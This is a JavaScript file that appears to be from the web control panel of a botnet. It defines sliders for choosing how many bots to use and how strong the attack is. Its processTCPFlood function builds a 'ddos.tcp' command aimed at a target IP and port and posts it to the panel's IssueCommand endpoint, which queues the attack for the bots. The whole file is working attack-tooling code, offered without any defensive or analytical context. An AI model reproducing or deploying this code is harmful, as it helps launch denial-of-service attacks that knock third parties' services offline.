var tcpfloodbotsmouseState=0;
var tcpfloodstrengthmouseState=0;

function tcpfloodstrength_Slider(event){
	var x;if (event.layerX) {x = event.layerX - 2;} else {x = event.x - 2;}if(Math.round((x / 96) * 100) > 100 || Math.round((x / 96) * 100) < 1) {return;}
	$("#TCPFlood_Strength_InnerSlider").css("width", x + "px");
	$("#TCPFlood_Strength").val((Math.round(((x / 96) * 100))) + "%");
}
function tcpfloodstrength_SliderBegin(event){tcpfloodstrengthmouseState=1;}
function tcpfloodstrength_SliderMove(event) {if (tcpfloodstrengthmouseState == 1) {tcpfloodstrength_Slider(event);}}
function tcpfloodstrength_SliderEnd(event) {tcpfloodstrengthmouseState=0;}

function tcpfloodbots_Slider(event){
	var x;if (event.layerX) {x = event.layerX - 2;} else {x = event.x - 2;}if(Math.round((x / 96) * 100) > 100 || Math.round((x / 96) * 100) < 1) {return;}
	$("#TCPFlood_Bots_InnerSlider").css("width", x + "px");
	$("#TCPFlood_Bots").val(Math.round(((x / 96) * totalbots)));
}
function tcpfloodbots_SliderBegin(event){tcpfloodbotsmouseState=1;}
function tcpfloodbots_SliderMove(event) {if (tcpfloodbotsmouseState == 1) {tcpfloodbots_Slider(event);}}
function tcpfloodbots_SliderEnd(event) {tcpfloodbotsmouseState=0;}

function processTCPFlood(obj) {
	var poststring = '';
	var commandstring = 'ddos.tcp ';
	commandstring += escape($("#TCPFlood_TargetIP").val() + ":" + $("#TCPFlood_TargetPort").val());
	commandstring += " " + Math.round(1000 - ((parseInt($("#TCPFlood_Strength").val().replace("%", ""), 10) / 100) * 1000)) + " " + $("#TCPFlood_Duration").val();
	poststring="&submit=1&command=" + escape(commandstring) + "&commandquota=" + $("#TCPFlood_Bots").val();
	$("#desktop-window-tcpflood-content").html("Loading...");
	$.ajax({
		async: true,
		url: "index.php?p=IssueCommand",
		type: "POST",
		data: poststring,
		success: function(data){
			$("#desktop-window-tcpflood-content").html("Successfully added command to Task Queue.<br /><br />" +
			"<a href=\"javascript:void(0)\" onclick=\"TCPFlood_Reload()\">Click here</a> to add another ddos attack.");
		}
	});
	return false;
}

function TCPFlood_Reload(){
	showWindow('tcpflood');
}

